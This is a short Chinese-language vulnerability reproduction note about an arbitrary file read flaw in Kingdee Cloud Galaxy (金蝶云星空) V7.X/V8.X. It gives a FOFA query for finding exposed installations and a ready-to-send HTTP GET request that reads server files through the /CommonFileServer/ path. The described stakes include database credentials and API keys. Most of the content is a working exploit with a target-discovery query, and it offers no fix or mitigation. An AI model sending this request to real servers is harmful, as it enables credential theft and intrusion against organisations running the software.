<a name="e6Em4"></a>
# 一、漏洞描述
```java
金蝶云星空V7.X、V8.X所有私有云和混合云版本存在一个通用漏洞，攻击者可利用此漏洞获取服务器上的任意文件，包括数据库凭据、API密钥、配置文件等，从而获取系统权限和敏感信息。
```
<a name="NpLPF"></a>
# 二、fofa搜索语法
```java
app="金蝶云星空-管理中心"
```
<a name="TNcUl"></a>
# 三、漏洞复现
```java
GET /CommonFileServer/c:/windows/win.ini HTTP/1.1
Host: 
accept: */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```
![image.png](https://cdn.nlark.com/yuque/0/2024/png/42988647/1719241554494-d084ba78-ad7e-4e11-8a7f-d353bb6feeb9.png#averageHue=%23fbfbfb&clientId=ud521e60a-9dae-4&from=paste&height=433&id=ud617e0de&originHeight=541&originWidth=1391&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=98253&status=done&style=none&taskId=u2965e494-80a3-487c-b0c0-1d6bc1bfe43&title=&width=1112.8)








